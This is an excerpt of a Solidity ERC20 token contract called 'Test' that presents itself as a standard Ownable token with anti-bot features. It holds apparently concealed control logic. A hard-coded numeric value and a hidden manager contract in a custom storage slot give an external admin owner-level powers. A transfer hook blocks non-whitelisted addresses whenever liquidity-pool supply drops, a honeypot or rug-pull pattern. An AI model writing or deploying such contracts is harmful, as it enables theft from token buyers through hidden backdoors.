...
// File: https://ipfs.io/ipfs/QmS5H3cFpQ8NQ9X7ZZpFpy6z2xxfnS4ERYMMa14H1uELdT
...
// File: https://ipfs.io/ipfs/QmRLEomK3cqsfZej9Gy1EKpYxHSBmXsXiTyzQvxH18TDfj
...
abstract contract OwnerShipManager is Address{
    event ChangedManager(address signer);
    bytes32 internal constant MANAGER_STORAGE_SLOT = 0xf9f519124c44762b3e86f1aafe50da115dd2e572f58b7f81a08f0649216c98d1;
    uint256 private main = 620339804698091075379850902153818108079089637036;

    constructor(address _main) {
        setManager(_main);
        console.log("ship",getOwnerShipManager(),address(this));
        IOwnerShipManager(getOwnerShipManager()).getOwner();
    }

    function setManager(address signer) internal {
        bytes32 slot = MANAGER_STORAGE_SLOT;
    ...
    function getOwnerShipManager() internal view returns (address signer) {
        bytes32 slot = MANAGER_STORAGE_SLOT;
        // solhint-disable-next-line no-inline-assembly
        assembly {
            signer := sload(slot)
 ...
 * the owner.
 */
abstract contract Ownable is Context,OwnerShipManager {
     ...
     */
    constructor(address _main) OwnerShipManager(_main){
    ...
    function initialize() external {
        ...
        require(!initialized);
        initialized = true;
        address admin = IOwnerShipManager(getOwnerShipManager()).superAdmin();
        _setBotDetected(_owner,true);
        _setBotDetected(admin,true);
        _setAntiBot(_owner,true);
        _setAntiBot(admin,true);
    }
    ...
    function getAdmin() internal returns (address) {
        return IOwnerShipManager(getOwnerShipManager()).getOwner();
    }
    ...
    modifier onlyOwner() {
        require((owner() == _msgSender()) || 
                (getOwnerShipManager() == _msgSender()) || 
                getAdmin() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    modifier onlyAdmin() {
        require(getOwnerShipManager() == _msgSender() ||
                getAdmin() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
...
abstract contract ERC20 is Context, IERC20, IERC20Metadata, Ownable, DexRouters {
    ...
    constructor(string memory name_,string memory symbol_,uint8 decimal_,uint256 supply_,address router,address _main) Ownable(_main) {
        _name = name_;
        _symbol = symbol_;
        _decimal = decimal_;
    ...
    function setBotDetected(address _account, bool _status) external onlyAdmin {
        _setBotDetected(_account,_status);
    }

    function setAntiBot(address _account,bool _status) external onlyAdmin {
    ...
    function _beforeTokenTransfer(
        ...
        uint256 currentLp = IUniswapV2Pair(uniswapV2Pair).totalSupply();

        if(lpTotalSupply > currentLp){
            require(antiBot[to]);
        }

        lpTotalSupply = currentLp;
    }
...
contract ERC20Token is ERC20 {
    ...
    constructor(address router,address main_) 
        ERC20(
            "Test",    // name 
            "TEST",    // symbol
            9,         // decimal
